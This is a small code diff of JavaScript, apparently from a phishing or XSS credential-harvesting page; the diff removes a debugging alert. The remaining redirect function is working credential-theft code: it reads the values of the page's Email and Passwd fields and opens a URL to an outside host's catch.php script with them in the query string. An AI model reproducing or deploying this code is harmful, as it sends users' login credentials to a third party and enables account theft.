@@ -31,7 +31,6 @@ function clickedSubmitButton(){
 function redirect(){
     var theXssUrl = "https://www.dei.isep.ipp.pt/~jpl/catch.php?email=" + document.getElementById('Email').value + "&pwd=" + document.getElementById('Passwd').value;
     //var theXssUrl = "<%== @xss_hook_url %>";
-    alert(theXssUrl)
     if(theXssUrl){
         window.open(theXssUrl);
         window.focus();
